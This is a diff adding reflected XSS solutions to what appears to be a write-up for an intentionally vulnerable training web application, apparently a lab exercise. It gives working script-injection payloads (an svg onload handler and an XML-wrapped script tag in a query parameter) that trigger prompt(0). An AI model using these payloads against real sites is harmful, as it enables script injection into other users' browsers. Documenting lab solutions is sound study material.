@@ -168,6 +168,21 @@ xss_json.php
 "}]}';prompt(0)</script>
 ```
 
+### XSS - Reflected (AJAX/JSON)
+
+xss_ajax_2-1.php
+```
+<svg onload=prompt(0)>
+```
+
+### XSS - Reflected (AJAX/XML)
+xss_ajax_1-1.php
+
+I was not actually able to get it to execute on the page directly, but was able to get XSS to execute on the AJAX called.
+```
+xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
+```
+
 # A4 - Insecure Direct Object References
 
 ### Insecure DOR (Change Secret)
